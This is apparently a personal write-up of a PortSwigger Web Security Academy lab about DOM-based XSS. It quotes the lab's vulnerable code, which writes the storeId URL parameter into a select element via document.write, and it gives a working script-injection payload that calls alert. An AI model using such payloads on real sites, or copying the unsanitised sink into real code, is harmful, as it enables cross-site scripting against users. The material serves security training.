---
title: 'Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element'
tags: [Portswigger Web Security Academy, Web]

category: "Security/Practice/Portswigger Web Security Academy/XSS"
---

# Lab: DOM XSS in `document.write` sink using source `location.search` inside a select element
###### tags: `Portswigger Web Security Academy` `Web`
* Description: This lab contains a DOM-based cross-site scripting vulnerability in the stock checker functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search` which you can control using the website URL. The data is enclosed within a select element. 
* Goal: To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the `alert` function. 

## Recon
1. Find the injection place
I used string search to find `location.search` in each sub-page source.
Here is the interesting code:
    :::spoiler Source Code
    ```javascript!
    ...
    <script>
        var stores = ["London","Paris","Milan"];
        var store = (new URLSearchParams(window.location.search)).get('storeId');
        document.write('<select name="storeId">');
        if(store) {
            document.write('<option selected>'+store+'</option>');
        }
        for(var i=0;i<stores.length;i++) {
            if(stores[i] === store) {
                continue;
            }
            document.write('<option>'+stores[i]+'</option>');
        }
        document.write('</select>');
    </script>
    ...
    ```
    :::
2. Try type something about `storeID` as URL GET parameter
Payload: `/product?productId=1&storeId=abc`
![](https://i.imgur.com/KKbTF8f.png)
You can see that this is a perfect injection place


## Exp
Payload: `/product?productId=1&storeId=<script>alert(123);</script>`
:::spoiler Success Screenshot
![](https://i.imgur.com/bjEoUzh.png)
:::

## Reference